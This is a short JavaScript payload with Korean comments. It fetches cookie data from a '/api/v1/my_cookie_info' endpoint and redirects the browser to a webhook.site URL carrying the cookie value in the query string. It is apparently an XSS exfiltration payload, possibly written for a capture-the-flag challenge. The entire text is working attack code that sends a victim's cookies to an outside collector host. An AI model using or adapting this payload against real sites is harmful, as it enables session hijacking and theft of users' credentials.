fetch("/api/v1/my_cookie_info")
    .then((response) => response.json())
    .then((data) => {
        // 쿠키 데이터를 로그로 확인
        console.log(data.cookies[0]);

        // 쿠키 값이 객체일 경우, 특정 속성을 추출
        var cookie = data.cookies[0].value || JSON.stringify(data.cookies[0]);

        // location.href로 웹훅 사이트로 쿠키 값을 전달하며 페이지 이동
        location.href = "https://webhook.site/4abb2b29-16db-4d83-b99e-86818bc20491?q=" + encodeURIComponent(cookie);
    })
    .catch((error) => {
        console.error("Error fetching cookie info:", error);
    });
